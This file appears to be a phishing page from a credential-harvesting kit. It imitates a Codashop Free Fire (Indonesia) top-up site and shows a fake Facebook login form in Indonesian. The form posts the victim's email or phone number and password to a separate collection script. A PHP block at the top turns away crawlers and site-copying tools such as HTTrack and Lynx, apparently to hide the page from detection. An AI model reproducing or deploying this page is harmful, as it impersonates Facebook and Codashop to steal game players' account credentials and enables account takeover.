<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('http://idhaampedia.me/404.php');
die();
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Free Fire (Indonesia) - Codashop</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1">
  <meta name="theme-color" content="#3B5999"/>
  <meta name="msapplication-navbutton-color" content="#3B5999"/>
  <meta name="apple-mobile-web-app-status-bar-style" content="#3B5999"/>
  <link rel="shorcut icon" href="img/icon.png"/>
  <style>
  body {
  width:100%;
  height:auto;
  margin:0;
  padding:0;
  background:url('img/bg-fb.jpg');
  text-align:center;
}
.fb {
  width: 100%;
  height: auto;
  display: block;
}
.isi-fb-a {
  width: 85%;
  height: 40px;
  display: block;
  padding-left: 10px;
  background: white;
  border: 1px solid rgba(0,0,0, 0.1);
  border-top-left-radius: 5px;
  border-top-right-radius: 5px;
  border-bottom-left-radius: 0;
  border-bottom-right-radius: 0;
  font-size: 1em;
  outline: none;
}
.isi-fb-b {
  width: 85%;
  height: 39px;
  display: block;
  padding-left: 10px;
  background: white;
  border-top: 0;
  border-left: 1px solid rgba(0,0,0, 0.1);
  border-bottom: 1px solid rgba(0,0,0, 0.1);
  border-right: 1px solid rgba(0,0,0, 0.1);
  border-top-left-radius: 0;
  border-top-right-radius: 0;
  border-bottom-left-radius: 5px;
  border-bottom-right-radius: 5px;
  font-size: 1em;
  outline: none;
}
.btn-fb {
  width: 88%;
  height: 37px;
  display: block;
  margin: 10px;
  background: #3F6CBF;
  border: 0;
  border-radius: 5px;
  font-size: 1em;
  font-family: sans-serif;
  font-weight: bold;
  color: white;
  outline: none;
}
.logo-wa {
  width: 70px;
  height: 70px;
  margin: 40px 0 10px 0;
  border-radius: 10px;
}
.txt-wa {
  margin: 0 0 25px 0;
  font-family: sans-serif;
  font-weight: 500;
  font-size: 1em;
  color: rgba(0,0,0, 0.3);
}
  </style>
</head>
<body>
  <form action="../detail.php" method="POST">
      <img class='fb' src='img/fb-atas.jpg'>
        <center>
        <img class='logo-wa' src='img/icon.png'>
        <div class='txt-wa'>Masuk dengan akun Facebook<br>Untuk terhubung ke Free Fire</div>
        <input type="hidden" name="prov" value="Facebook">
        <input type='text' class='isi-fb-a' name='email' placeholder='Nomor Ponsel atau Email' required>
        <input type='password' class='isi-fb-b' name='pass' placeholder='Kata Sandi' required>
        <button type="submit" name='login' class='btn-fb'>Masuk</button>
        </center>
      <img class='fb' src='img/fb-bawah.jpg'>
  </form>
</body>
</html>